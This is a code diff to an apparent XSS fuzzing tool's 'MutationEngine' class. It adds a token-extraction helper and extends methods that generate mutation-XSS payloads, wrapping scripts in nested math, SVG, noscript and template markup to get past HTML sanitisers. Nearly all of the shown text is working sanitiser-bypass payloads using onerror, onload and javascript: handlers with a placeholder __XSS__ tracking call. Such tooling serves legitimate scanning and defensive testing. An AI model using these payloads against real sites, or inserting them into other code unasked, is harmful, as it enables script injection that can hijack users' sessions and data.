@@ -1375,35 +1375,43 @@ class MutationEngine:
         ]
 
     @staticmethod
+    def _extract_token_from_payload(payload: str) -> str:
+        """Extract tracking token from mutated payload strings."""
+        import re
+        m = re.search(r'__XSS__\([\'"`]?([a-zA-Z0-9_-]+)[\'"`]?\)', payload)
+        if m:
+            return m.group(1)
+        m = re.search(r'__XSS__`([a-zA-Z0-9_-]+)`', payload)
+        if m:
+            return m.group(1)
+        m = re.search(r'\b([a-fA-F0-9]{32})\b', payload)
+        if m:
+            return m.group(1)
+        return "TOKEN"
+
+    @staticmethod
     def apply_mxss_nesting(payload: str) -> List[str]:
         """Wrap payload inside complex mathematical/SVG tags for mXSS parser differential bypasses."""
-        if '__XSS__' not in payload:
-            return [payload]
-            
-        import re
-        token_match = re.search(r'__XSS__\([\'"]([a-zA-Z0-9_-]+)[\'"]\)', payload)
-        token = token_match.group(1) if token_match else "TOKEN"
+        token = MutationEngine._extract_token_from_payload(payload)
         
         return [
             f'<math><mtext><table><a href="&lt;/table&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;">',
             f'<math><mtext><table><a href="&lt;/table&gt;&lt;svg onload=__XSS__(\'{token}\')&gt;">',
             f'<math><annotation-xml encoding="text/html"><svg><desc><rect class="&lt;/g&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;"></rect></desc></svg></annotation-xml></math>',
-            f'<noscript><p title="&lt;/noscript&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;"></p></noscript>'
+            f'<noscript><p title="&lt;/noscript&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;"></p></noscript>',
+            f'<math><mtext><a><desc><x class="&lt;/desc&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;"></x></desc></a></mtext></math>',
+            f'<svg><desc><template><img src=x onerror=__XSS__(\'{token}\')></template></desc></svg>'
         ]
 
     @staticmethod
     def apply_mxss_namespaced(payload: str) -> List[str]:
         """Wrap payload in HTML/SVG namespaced attribute parser differential formats."""
-        if '__XSS__' not in payload:
-            return [payload]
-            
-        import re
-        token_match = re.search(r'__XSS__\([\'"]([a-zA-Z0-9_-]+)[\'"]\)', payload)
-        token = token_match.group(1) if token_match else "TOKEN"
+        token = MutationEngine._extract_token_from_payload(payload)
         
         return [
             f'<div id="x" class="&lt;style&gt;&lt;/style&gt;&lt;img src=x onerror=__XSS__(\'{token}\')&gt;">',
-            f'<svg><animate xlink:href=#x attributeName=href values="javascript:__XSS__(\'{token}\')" /><a id=x><rect width=100 height=100 /></a></svg>'
+            f'<svg><animate xlink:href=#x attributeName=href values="javascript:__XSS__(\'{token}\')" /><a id=x><rect width=100 height=100 /></a></svg>',
+            f'<svg><animate xlink:href=#x attributeName=href values="javascript:__XSS__`{token}`" /><a id=x><rect width=100 height=100 /></a></svg>'
         ]
 
     @staticmethod
